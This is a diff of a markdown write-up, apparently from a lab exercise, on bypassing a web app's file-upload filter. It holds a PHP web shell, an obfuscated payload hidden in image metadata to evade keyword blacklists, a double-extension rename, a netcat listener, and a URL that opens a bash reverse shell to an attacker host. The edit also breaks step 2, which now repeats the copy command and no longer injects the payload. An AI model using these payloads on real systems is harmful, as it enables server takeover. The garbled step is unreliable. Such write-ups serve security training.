@@ -34,9 +34,9 @@ passthru(, pcntl_exec(, posix_getuid(, <script>, etc.
 
 On Kali, I created a basic shell:
     
-    '''bash
-    <?php system($_GET['cmd']); ?>
-    '''
+```bash
+<?php system($_GET['cmd']); ?>
+```
 
 ### Step 2: Attempt to bypass with double extensions
 
@@ -68,38 +68,35 @@ Error message:
 Filtering Bypass Attempts
 
 Attempt: Appending PHP payload directly to an image
-   
-     '''bash
-     echo "<?php system(\$_GET['cmd']); ?>" >> shell.png
-     mv shell.png shell.php.png
-     '''
+
+```bash
+echo "<?php system(\$_GET['cmd']); ?>" >> shell.png
+mv shell.png shell.php.png
+```
  
-          
      
 Working Solution: Metadata Injection + Obfuscation 
 
    1. Use a clean, existing image
-    
-          '''bash
-          cp /usr/share/icons/gnome/256x256/devices/computer.png shell.png
-          '''
-                  
+          
+        ```bash
+        cp /usr/share/icons/gnome/256x256/devices/computer.png shell.png
+        ```
+                          
         ![image](https://github.com/user-attachments/assets/d6660168-cb58-419d-b93f-e2ee53d6af1f)
 
     
    2. Inject an obfuscated PHP payload into the image’s metadata
-        
-          '''bash
-          exiftool -Title='<?php $x="call"."_user_func"; $x($_GET["a"], $_GET["b"]); ?>' shell.png
-          '''
+      ```bash
+        cp /usr/share/icons/gnome/256x256/devices/computer.png shell.png
+        ```
     
    This avoids all blacklisted keywords (system, eval, etc.)        
     
    3. Renommer l’image avec une double extension
-    
-          '''bash
-          mv shell.png shell.php.png
-          '''
+      ```bash
+        mv shell.png shell.php.png
+        ```
 
    4. Upload successful  
 
@@ -121,19 +118,16 @@ Final Goal: Trigger Remote Code Execution
 
 1. Start a Netcat listener on Kali:
 
-
-        '''bash
-        nc -lvnp 4444
-        '''
+   ```bash
+   nc -lvnp 4444
+   ```
 
    ![image](https://github.com/user-attachments/assets/f4e72480-6804-4099-8820-356d4f934546)
     
  2. Trigger the payload through the browser
-             
-         '''bash
-         http://192.168.56.101:5173/upload/shell.php.png?a=system&b=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.56.102/4444+0>%261'         
-         '''
-
+    ```bash
+    http://192.168.56.101:5173/upload/shell.php.png?a=system&b=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.56.102/4444+0>%261'
+    ```   
 
 Conclusion :
 
